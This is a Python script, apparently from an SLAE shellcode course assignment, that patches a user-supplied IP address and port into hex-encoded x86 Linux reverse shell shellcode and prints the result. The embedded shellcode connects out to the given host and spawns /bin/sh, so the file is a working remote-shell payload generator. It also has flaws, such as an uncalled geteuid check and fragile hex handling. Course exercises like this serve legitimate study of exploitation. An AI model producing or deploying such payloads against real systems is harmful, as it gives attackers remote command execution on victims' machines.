#!/usr/bin/env python
# SLAE assignment 1
# TCP reverse shell port wrapper
# Author: PA-7854 ( - @_Kiewicz)
# Simple wrapper to change IP and port directly in shellcode


import sys
import os
import binascii
import socket


if len(sys.argv) != 3:
    print("\nUsage: " + sys.argv[0] + " [IP]" + " [PORT] " )
    print("\n\tSample: " + sys.argv[0] + " 127.5.5.1 " + " 9797 " )
    print("[!] Remember: Ports under 1024 should be run under root")
    exit(1)

ip = str(sys.argv[1])
port = int(sys.argv[2])

if port < 1024 and os.geteuid != 0:
    print("[E] To bind a port number < 1024 you need to be root")
    exit(2)

# Remove 0x char suffix

ip = binascii.hexlify(socket.inet_aton(ip)).replace('00','')
port = hex(port).strip('0x')

# TODO: Workaround for NULL bytes in IP or port
# TODO: Workaround for ports whom contain only 1 character

shellcode = ("\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x31\\xff\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xb2\\x06\\xcd\\x80\\x89\\xc3\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x30\\x39\\x66\\x6a\\x02\\x89\\xe1\\x66\\xb8\\x6a\\x01\\xb2\\x10\\xcd\\x80\\x31\\xc9\\xb1\\x02\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\xfe\\xc9\\x79\\xf8\\x31\\xc9\\xb0\\x0b\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xf1\\x89\\xf2\\xcd\\x80")

# Get offset
port_offset = shellcode.index("\\x30\\x39")
ip_offset = shellcode.index("\\x7f\\x01\\x01\\x01")
splitted = list(shellcode)

splitted[port_offset:port_offset+8] = '\\x' + str(port[0:2]) + '\\x' + str(port[2:4]) 

splitted[ip_offset:ip_offset+16] = '\\x' + str(ip[0:2]) + '\\x' + str(ip[2:4]) + '\\x' + str(ip[4:6]) + '\\x' + str(ip[6:8]) 

shellcode = ''.join(splitted)

if '\\x00' in shellcode:
    print("[E] Your shellcode contains NULL bytes, please choose another port")
    exit(3)


print("New shellcode is: \n" + shellcode)
